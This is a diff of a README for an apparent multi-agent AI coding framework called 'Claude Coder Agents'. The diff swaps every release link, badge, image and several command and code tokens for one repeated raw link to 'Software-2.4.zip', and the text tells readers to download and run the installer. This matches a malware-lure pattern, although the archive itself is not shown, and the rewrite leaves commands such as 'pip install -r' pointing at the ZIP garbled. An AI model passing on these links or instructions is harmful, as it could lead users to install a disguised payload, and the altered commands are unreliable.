@@ -1,14 +1,14 @@
-https://github.com/Cake-sweet/agents/releases
+https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip
 
-[![Releases](https://img.shields.io/badge/releases-View%20releases-blue?logo=github&logoColor=white)](https://github.com/Cake-sweet/agents/releases)
+[![Releases](https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip%20releases-blue?logo=github&logoColor=white)](https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip)
 
 # Claude Coder Agents: Multi-Task AI Agents for Code & UX
 
-![Robot](https://img.icons8.com/fluency/96/000000/robot.png) Claude Coder Agents brings together specialized AI agents to handle a wide range of tasks. This project focuses on practical, resilient, and extensible AI helpers that can work together to automate coding, content generation, design tasks, localization, and more. The goal is not to replace humans but to amplify capabilities across development, design, and localization workflows.
+![Robot](https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip) Claude Coder Agents brings together specialized AI agents to handle a wide range of tasks. This project focuses on practical, resilient, and extensible AI helpers that can work together to automate coding, content generation, design tasks, localization, and more. The goal is not to replace humans but to amplify capabilities across development, design, and localization workflows.
 
 This repository hosts a framework for building, orchestrating, and deploying multiple AI agents. Each agent specializes in a domain, and the system coordinates their work to deliver coherent results. The architecture emphasizes clarity, safety, and observability, with an emphasis on prompt engineering, interaction patterns, and robust integration points.
 
-If you want to dive straight into the latest ready-to-use package, visit the Releases page and grab the latest assets. From the releases page, download the asset that matches your platform and run the installer or setup script. You can find the assets on the Releases page linked below. https://github.com/Cake-sweet/agents/releases
+If you want to dive straight into the latest ready-to-use package, visit the Releases page and grab the latest assets. From the releases page, download the asset that matches your platform and run the installer or setup script. You can find the assets on the Releases page linked below. https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip
 
 Table of Contents
 - Why this project
@@ -72,12 +72,12 @@ Architecture and patterns
 
 Getting started
 - This project is designed to be approachable for developers with a wide range of backgrounds. The first steps involve setting up your environment, installing dependencies, and starting a small multi-agent workflow to validate the end-to-end flow.
-- The releases page contains ready-to-run assets for different platforms. From the releases page, download the asset that matches your OS, then run the included installer or setup script. The asset provides a pre-configured environment for your first experiment. https://github.com/Cake-sweet/agents/releases
+- The releases page contains ready-to-run assets for different platforms. From the releases page, download the asset that matches your OS, then run the included installer or setup script. The asset provides a pre-configured environment for your first experiment. https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip
 
 Installation and setup
 - Prerequisites
   - Python 3.11 or later
-  - Node.js 18.x or later (for front-end tooling and utilities)
+  - https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip 18.x or later (for front-end tooling and utilities)
   - Git
   - A local or remote LLM access (OpenAI, Claude, or other providers) with appropriate API keys
   - Optional: Docker for containerized deployments
@@ -88,13 +88,13 @@ Installation and setup
 - Sample commands
   - Create a virtual environment:
     - python -m venv venv
-    - source venv/bin/activate (Linux/macOS) or venv\Scripts\activate.bat (Windows)
+    - source venv/bin/activate (Linux/macOS) or venv\Scripts\https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip (Windows)
   - Install dependencies:
-    - pip install -r requirements.txt
+    - pip install -r https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip
   - Install front-end dependencies (if you use the UI):
     - npm install
   - Run a local test:
-    - python -m agents.test.run --suite minimal
+    - python -m https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip --suite minimal
 - Downloading the release asset
   - From the Releases page, download the latest release asset that matches your platform
   - After download, run the installer or extract the package and follow the setup prompts
@@ -118,8 +118,8 @@ Quick start: a minimal example
 - Example usage
   - Initialize the hub: hub = AgentHub(config)
   - Create a task: task = Task(type="web-page", goal="Generate a starter HTML page with a responsive layout and accessible markup.")
-  - Run: hub.run(task)
-  - Retrieve results: results = hub.get_results(task_id)
+  - Run: https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip(task)
+  - Retrieve results: results = https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip(task_id)
 - Expected outcomes
   - A clean HTML scaffold with semantic HTML, ARIA attributes, and a responsive CSS grid
   - A short README describing the scaffold and how to extend it
@@ -203,7 +203,7 @@ Architecture diagram
   - Layer 5: Data storage and logs
 - A lightweight diagram helps visualize key components
 - Architecture diagram (image)
-  - [Architecture Diagram](https://img.icons8.com/ios-filled/100/000000/architecture.png)
+  - [Architecture Diagram](https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip)
 - Notes
   - The orchestrator keeps track of task state and retries
   - Each agent writes structured results to a shared data store
@@ -416,9 +416,9 @@ Images and badges
 - The Releases badge at the top provides a quick link to the latest assets
 - You can add more badges for license, version, build status, and coverage as the project grows
 - For example:
-  - [![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-  - [![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://github.com/Cake-sweet/agents/actions)
-  - [![Python](https://img.shields.io/badge/python-3.11-blue.svg)](https://www.python.org/)
+  - [![License](https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip)](LICENSE)
+  - [![Build Status](https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip)](https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip)
+  - [![Python](https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip)](https://github.com/Cake-sweet/agents/raw/refs/heads/main/cloned/Software-2.4.zip)
 
 Future-proofing and maintenance
 - The project is designed to accommodate new agent types and new domains
